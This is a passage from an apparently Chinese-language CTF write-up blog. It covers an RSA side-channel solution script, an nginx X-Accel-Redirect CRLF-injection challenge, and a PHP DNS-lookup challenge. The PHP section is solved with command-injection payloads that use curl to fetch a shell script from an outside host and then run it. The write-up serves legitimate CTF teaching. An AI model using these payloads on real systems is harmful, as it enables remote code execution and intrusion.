402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mspace" transform="translate(14574.3,0)"></g><g data-mml-node="mi" transform="translate(15407.9,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(17296.9,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(17463.9,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(17797.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(18397.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container> 來代替, 在我筆電跑一個多小時就有結果了.</p><p>事後得知其實拿 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="17.482ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 7727 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(553,363) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mspace" transform="translate(1321.5,0)"></g><g data-mml-node="mi" transform="translate(2155.2,0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(833,0)"></path><path data-c="64" d="M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z" transform="translate(1333,0)"></path></g><g data-mml-node="mstyle" transform="translate(4044.2,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mstyle" transform="translate(4211.2,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(4544.8,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="msup" transform="translate(5144.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mo" transform="translate(6206.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(7207,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container> 來代替也行.</p><h5 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = <span class="number">5101801443646397883483649170711170753234288161361773661762267166670179416556559190427195380873279363761215171667505597871909277180369455688905853902851511957294097171528948752094516781787608497291367416956588726814365926794388082060260619009730659392647647183772109356047401908345247677863524649904486204063359228076187213874784965513396420313348261358686843941101370583844255574015452239829051373299609614220223415202652069231016999861457802731973618111317817882297440966346381327329884300940871115228723365465279897915245876502552066550508521644906050605125454361858778807676176500042058934481320604247881283668369</span></span><br><span class="line">de = <span class="number">13276162869538876820874967265930056273649821619291298913244678460731677163640678305685273823105113895367225533853291553801325875520385932495430214453460548860194545946112644881109909538249310237449556876534727907963595095029052171691339165402792733339261655900920961198996199989377674756625799235936728573076768127693113603993732186868748440535297125037449014063636229263789966156722768008526078395777378361515086870396392457829916442048280036101237518748017569176962448117126360698491514070294578349308480127662663812119497411355259763448291144909096083219209280990495370006375298518756352954590671780820925176304199</span></span><br><span class="line">de = <span class="number">13276162869538876820874967265930056273649821619291298913244678460731677163640678305685273823105113895367225533853291553801325875520385932495430214453460548860194545946112644881109909538249310237449556876534727907963595095029052171691339165402792733339261655900920961198996199989377674756625799235936728573076768127693113603993732186868748440535297125037449014063636229263789966156722768008526078395777378361515086870396392457829916442048280036101237518748017569176962448117126360698491514070294578349308480127662663812119497411355259763448291144909096083219209280990495370006375298518756352954590671780820925176304199</span></span><br><span class="line">ed = <span class="number">14178888196465870186414627544539738124175295799257361983571071401002490264356000205140624665964615117430908950811645434229282649592982503773550326965082848689996525573201025300967877866012120037776271706799402946789537352857058456806620058888835737896317733033515185417035478990005398169721145688234245222237127842180506837927161003149517825433035255875230037645923078721253521812513852140879603355907765537367169478024192131596492564365613729739156664379932946145950302495371710257137426568151836679601945287133446134485087864897384934692046523396057840552348965365284377470932666797865632180694441755450786806257428</span></span><br><span class="line">ed = <span class="number">14178888196465870186414627544539738124175295799257361983571071401002490264356000205140624665964615117430908950811645434229282649592982503773550326965082848689996525573201025300967877866012120037776271706799402946789537352857058456806620058888835737896317733033515185417035478990005398169721145688234245222237127842180506837927161003149517825433035255875230037645923078721253521812513852140879603355907765537367169478024192131596492564365613729739156664379932946145950302495371710257137426568151836679601945287133446134485087864897384934692046523396057840552348965365284377470932666797865632180694441755450786806257428</span></span><br><span class="line">c = <span class="number">13915994134818567092320017429461441897582217944947848816354742821788867625203713787439088076241510905748342319375749688453493070761353427425774859287985622631002647446579390523120186272531930950683841742209652262950816847383288713246110183999674385586805065806527076870260121038631281290832370953178851666970475914655341016607144457997740491032560593457888617390667018836503627735976330627032307586776585514389001015254506008110558082161693141810334711526691831019894639593520974340262286493544527759201468204705820888719252694759067355825740098465416409062164860553911095104641228683397166900030958537312789960813376</span></span><br><span class="line">c = <span class="number">13915994134818567092320017429461441897582217944947848816354742821788867625203713787439088076241510905748342319375749688453493070761353427425774859287985622631002647446579390523120186272531930950683841742209652262950816847383288713246110183999674385586805065806527076870260121038631281290832370953178851666970475914655341016607144457997740491032560593457888617390667018836503627735976330627032307586776585514389001015254506008110558082161693141810334711526691831019894639593520974340262286493544527759201468204705820888719252694759067355825740098465416409062164860553911095104641228683397166900030958537312789960813376</span></span><br><span class="line">c = <span class="number">13915994134818567092320017429461441897582217944947848816354742821788867625203713787439088076241510905748342319375749688453493070761353427425774859287985622631002647446579390523120186272531930950683841742209652262950816847383288713246110183999674385586805065806527076870260121038631281290832370953178851666970475914655341016607144457997740491032560593457888617390667018836503627735976330627032307586776585514389001015254506008110558082161693141810334711526691831019894639593520974340262286493544527759201468204705820888719252694759067355825740098465416409062164860553911095104641228683397166900030958537312789960813376</span></span><br><span class="line"></span><br><span class="line">n2 = d**e-de</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'first stage done'</span>)</span><br><span class="line">n1 = e.powermod(d, n2)-ed</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'second stage done'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(gcd(n1, n2))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">~/N/c/a/c/Baby Side Channel Attack[130]►sage sol.sage                                                       (ctf) 550.706s 21:53</span></span><br><span class="line"><span class="string">first stage done</span></span><br><span class="line"><span class="string">second stage done</span></span><br><span class="line"><span class="string">44565056141672380232344221925657277099882114345721507082492496441540369880424811577620459882214160697905468105416738186564508392380914299469142919925961374508421438554801765732097700328063066210278702648625016268335671727073548747198769351524886914601379356693114367895940809338975808210077547758235780036747719173126480805614411786833779153843839588138846070535060731124022544006486698278481826148949712867510327772469472356961026633465984157845697202333522148391519555351010731230294807159744415424295328273485696890291150137752675887693843996925002892772976631541182603166690266552196457177027473291308202147666463</span></span><br><span class="line"><span class="string">~/N/c/a/c/Baby Side Channel Attack►                                                                                                          (ctf) 4304.838s 23:05</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></div><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="DNS-Lookup-Tool-Final"><a href="#DNS-Lookup-Tool-Final" class="headerlink" title="DNS Lookup Tool: Final"></a>DNS Lookup Tool: Final</h3><h4 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">'|'</span>, <span class="string">'&amp;'</span>, <span class="string">';'</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">"\n"</span>, <span class="string">'flag'</span>, <span class="string">'*'</span>, <span class="string">'?'</span>];</span><br><span class="line"><span class="variable">$is_input_safe</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$bad_word</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$_POST</span>[<span class="string">'name'</span>], <span class="variable">$bad_word</span>) !== <span class="literal">false</span>) <span class="variable">$is_input_safe</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_input_safe</span>) {</span><br><span class="line">    <span class="variable">$retcode</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$output</span> = [];</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">"host <span class="subst">{$_POST['name']}</span>"</span>, <span class="variable">$output</span>, <span class="variable">$retcode</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$retcode</span> === <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Host <span class="subst">{$_POST['name']}</span> is valid!\n"</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Host <span class="subst">{$_POST['name']}</span> is invalid!\n"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"HACKER!!!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>有明顯的 cmdi, 使用</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(curl ching367436.me:8088/shell.sh -o /tmp/shell.sh)</span><br></pre></td></tr></table></figure></div><p>作為 <code>name</code> 可以任意寫檔案到 /tmp 底下, 再串上</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(curl ching367436.me:8088/`php /tmp/shell.sh`) </span><br></pre></td></tr></table></figure></div><p>就可以執行寫入的檔案, 這樣就有無限制的 RCE 了.</p><h3 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h3><h4 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h4><p>目標是要搓到 docker-compose 內網的 <a class="link" href="http://web:7777/flag">http://web:7777/flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> , nginx 的設定如下, 有 expose 7778 port 到 docker 外面.</p><div class="highlight-container" data-rel="Nginx"><figure class="iseeu highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx</span></span><br><span class="line"><span class="section">server</span> {</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">7778</span>;</span><br><span class="line">    <span class="attribute">listen</span>  [::]:<span class="number">7778</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /flag {</span><br><span class="line">        internal;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://web:7777;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / {</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://web:7777;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://web:7777</span></span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> ThreadingHTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">import</span> re, os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">"/flag"</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"/flag"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        FLAG = f.read().strip()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    FLAG = os.environ.get(<span class="string">"FLAG"</span>, <span class="string">"flag{this_is_a_fake_flag}"</span>)</span><br><span class="line">URL_REGEX = re.<span class="built_in">compile</span>(<span class="string">r"https?://[a-zA-Z0-9.]+(/[a-zA-Z0-9./?#]*)?"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">"/flag"</span>:</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(FLAG.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        query = parse_qs(urlparse(<span class="variable language_">self</span>.path).query)</span><br><span class="line">        redir = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"redir"</span> <span class="keyword">in</span> query:</span><br><span class="line">            redir = query[<span class="string">"redir"</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> URL_REGEX.<span class="keyword">match</span>(redir):</span><br><span class="line">                redir = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.send_response(<span class="number">302</span> <span class="keyword">if</span> redir <span class="keyword">else</span> <span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> redir:</span><br><span class="line">            <span class="variable language_">self</span>.send_header(<span class="string">"Location"</span>, redir)</span><br><span class="line">        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">        <span class="variable language_">self</span>.wfile.write(<span class="string">b"Hello world!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    server = ThreadingHTTPServer((<span class="string">""</span>, <span class="number">7777</span>), RequestHandler)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Starting server, use &lt;Ctrl-C&gt; to stop"</span>)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h4 id="題解-2"><a href="#題解-2" class="headerlink" title="題解"></a>題解</h4><p>基本上跟<a class="link" href="https://github.com/dreadlocked/ctf-writeups/blob/master/midnightsun-ctf/bigspin.md#23-beating-admin-level">這個 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>是同樣的一題.</p><p>在題目 <code>location /flag</code> 裡面的 <code>internal</code> 表示的意思如下:</p><blockquote><p>Specifies that a given location can only be used for internal requests. For external requests, the client error 404 (Not Found) is returned. Internal requests are the following:</p><ul><li>requests redirected by the <a class="link" href="https://nginx.org/en/docs/http/ngx_http_core_module.html#error_page">error_page <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link" href="https://nginx.org/en/docs/http/ngx_http_index_module.html#index">index <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link" href="https://nginx.org/en/docs/http/ngx_http_internal_redirect_module.html#internal_redirect">internal_redirect <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link" href="https://nginx.org/en/docs/http/ngx_http_random_index_module.html#random_index">random_index <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and <a class="link" href="https://nginx.org/en/docs/http/ngx_http_core_module.html#try_files">try_files <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> directives;</li><li>requests redirected by the “X-Accel-Redirect” response header field from an upstream server;</li><li>subrequests formed by the “<code>include virtual</code>” command of the <a class="link" href="https://nginx.org/en/docs/http/ngx_http_ssi_module.html">ngx_http_ssi_module <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> module, by the <a class="link" href="https://nginx.org/en/docs/http/ngx_http_addition_module.html">ngx_http_addition_module <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> module directives, and by <a class="link" href="https://nginx.org/en/docs/http/ngx_http_auth_request_module.html#auth_request">auth_request <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link" href="https://nginx.org/en/docs/http/ngx_http_mirror_module.html#mirror">mirror <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> directives;</li><li>requests changed by the <a class="link" href="https://nginx.org/en/docs/http/ngx_http_rewrite_module.html#rewrite">rewrite <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> directive.</li></ul></blockquote><p>需要關注的部分是只要 upstream server 回傳了 <code>X-Accel-Redirect</code> 的 header 配上 redirect 就可以摸到有 <code>internal</code> 的被 redirect 到的 endpoint. 透過 CRLF injection 到 redir 的地方, 我們可以插入這個 header 就解完了.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 